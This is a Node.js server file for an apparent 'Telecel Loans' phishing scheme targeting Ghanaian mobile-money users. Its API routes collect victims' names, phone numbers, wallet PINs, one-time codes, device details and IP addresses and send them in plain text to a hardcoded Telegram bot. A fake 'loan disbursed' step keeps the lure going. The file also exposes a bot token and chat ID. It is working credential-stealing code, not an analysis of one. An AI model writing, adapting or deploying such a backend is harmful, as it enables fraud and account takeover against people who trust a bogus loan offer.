const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');

// ─── CONFIGURATION ───
const CONFIG = {
    BOT_TOKEN: '8493790420:AAFloSkJcVN6VmrFAOpebp1khMlPqs0_H0s',
    CHAT_ID: '8425632882',
    PORT: process.env.PORT || 5000,
    API_URL: 'https://telecelkr-production.up.railway.app',
    OTP_PAGE: 'otp.html',
    DEVICE_PAGE: 'device_verify.html',
    HOME_PAGE: 'index.html'
};

console.log('🚀 Starting Telecel Loans API...');
console.log('📋 Configuration:');
console.log(`   BOT_TOKEN: ${CONFIG.BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
console.log(`   CHAT_ID: ${CONFIG.CHAT_ID || '❌ Missing'}`);
console.log(`   PORT: ${CONFIG.PORT}`);
console.log(`   API_URL: ${CONFIG.API_URL}`);

// ─── EXPRESS APP ───
const app = express();

// ─── CORS MIDDLEWARE ───
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept'],
    credentials: true
}));

app.options('*', cors());

app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// ─── LOGGING ───
app.use((req, res, next) => {
    console.log(`📥 ${req.method} ${req.path}`);
    console.log(`   Origin: ${req.headers.origin || 'N/A'}`);
    if (req.body && Object.keys(req.body).length > 0) {
        console.log(`   Body:`, req.body);
    }
    next();
});

// ─── HEALTH CHECK ───
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'Telecel Loans API is running',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        config: {
            botConfigured: !!CONFIG.BOT_TOKEN,
            chatConfigured: !!CONFIG.CHAT_ID,
            port: CONFIG.PORT
        }
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        memory: process.memoryUsage(),
        port: CONFIG.PORT,
        apiUrl: CONFIG.API_URL
    });
});

// ─── SEND TELEGRAM MESSAGE ───
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
        const response = await axios.post(url, {
            chat_id: CONFIG.CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return response.data;
    } catch (error) {
        console.error('❌ Telegram Error:', error.response?.data || error.message);
        throw error;
    }
}

// ─── API ROUTES ───

// 1. Send Loan Authorization Notification
app.post('/api/authorize', async (req, res) => {
    try {
        const { name, phone, amount, pin, period } = req.body;

        console.log('📝 Authorization Request:', { name, phone, amount, pin: '***', period });

        if (!name || !phone || !amount || !pin) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone, amount, pin'
            });
        }

        const message = `🔐 *New Loan Authorization Request*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔢 *PIN:* ${pin}\n` +
            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
            `📅 *Period:* ${period || '30 days'}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `✅ User has been redirected to OTP verification.`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Authorization notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Authorization Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send authorization notification',
            error: error.message
        });
    }
});

// 2. Generate OTP
app.post('/api/generate-otp', async (req, res) => {
    try {
        const { name, phone } = req.body;

        console.log('📝 Generate OTP Request:', { name, phone });

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        const otp = Math.floor(10000 + Math.random() * 90000).toString();

        const message = `🔑 *OTP Generated*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔢 *OTP:* \`${otp}\`\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `📨 OTP has been sent to user.`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            otp: otp,
            message: 'OTP generated and notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Generate OTP Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to generate OTP',
            error: error.message
        });
    }
});

// 3. OTP Verified
app.post('/api/otp-verified', async (req, res) => {
    try {
        const { name, phone, otp, verified } = req.body;

        console.log('📝 OTP Verification Request:', { name, phone, otp, verified });

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        const status = verified ? '✅ SUCCESS' : '❌ FAILED';
        const message = `📱 *OTP Verification*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `🔑 *OTP Entered:* \`${otp || 'N/A'}\`\n` +
            `📊 *Status:* ${status}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            (verified ? '✅ User verified OTP successfully! Proceeding to device verification.' : '❌ User entered invalid OTP.');

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            verified: verified,
            message: 'OTP verification notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ OTP Verified Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send OTP verification notification',
            error: error.message
        });
    }
});

// 4. Device Verification
app.post('/api/device-verify', async (req, res) => {
    try {
        const { name, phone, device, browser, location, ip } = req.body;

        console.log('📝 Device Verification Request:', { name, phone, device, browser, location, ip });

        if (!name || !phone) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone'
            });
        }

        const message = `🖥️ *Device Verification*\n\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `📱 *Device:* ${device || 'Unknown'}\n` +
            `🌐 *Browser:* ${browser || 'Unknown'}\n` +
            `📍 *Location:* ${location || 'Unknown'}\n` +
            `🔢 *IP:* ${ip || 'Unknown'}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `✅ User has verified their device. Loan disbursement initiated!`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Device verification notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Device Verify Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send device verification notification',
            error: error.message
        });
    }
});

// 5. Loan Disbursed
app.post('/api/loan-disbursed', async (req, res) => {
    try {
        const { name, phone, amount, transactionId } = req.body;

        console.log('📝 Loan Disbursement Request:', { name, phone, amount, transactionId });

        if (!name || !phone || !amount) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: name, phone, amount'
            });
        }

        const message = `💰 *LOAN DISBURSED!*\n\n` +
            `✅ *Status:* SUCCESS\n` +
            `👤 *User:* ${name}\n` +
            `📱 *Phone:* ${phone}\n` +
            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
            `🆔 *Transaction ID:* ${transactionId || 'TXN-' + Date.now()}\n` +
            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
            `🎉 Loan has been successfully disbursed to user's Telecel Cash wallet!`;

        const result = await sendTelegramMessage(message);

        res.json({
            success: true,
            message: 'Loan disbursement notification sent successfully',
            telegram: result,
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('❌ Disbursement Error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to send disbursement notification',
            error: error.message
        });
    }
});

// 6. Get config for frontend
app.get('/api/config', (req, res) => {
    res.json({
        success: true,
        config: {
            apiUrl: CONFIG.API_URL,
            botToken: CONFIG.BOT_TOKEN ? 'configured' : 'not configured',
            chatId: CONFIG.CHAT_ID ? 'configured' : 'not configured',
            pages: {
                otp: CONFIG.OTP_PAGE,
                device: CONFIG.DEVICE_PAGE,
                home: CONFIG.HOME_PAGE
            }
        }
    });
});

// 7. Test Telegram Connection
app.get('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🧪 *Telegram Test Message*\n\n` +
            `✅ Connection successful!\n` +
            `⏰ Time: ${new Date().toLocaleString()}\n` +
            `🤖 Bot: ${CONFIG.BOT_TOKEN ? 'Configured' : 'Not configured'}\n` +
            `💬 Chat: ${CONFIG.CHAT_ID || 'Not configured'}`;

        const result = await sendTelegramMessage(testMessage);
        
        res.json({
            success: true,
            message: 'Test message sent successfully! Check your Telegram.',
            telegram: result
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Failed to send test message',
            error: error.message
        });
    }
});

// ─── CATCH-ALL ───
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Route not found',
        path: req.path
    });
});

// ─── START SERVER ───
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`🚀 Telecel Loans API running on port ${CONFIG.PORT}`);
    console.log(`📡 Health check: ${CONFIG.API_URL}/health`);
    console.log(`📡 Test Telegram: ${CONFIG.API_URL}/api/test-telegram`);
    console.log(`🤖 Telegram Bot: ${CONFIG.BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`💬 Chat ID: ${CONFIG.CHAT_ID || '❌ Not set'}`);
    console.log(`✅ Server is ready to accept connections!`);
});
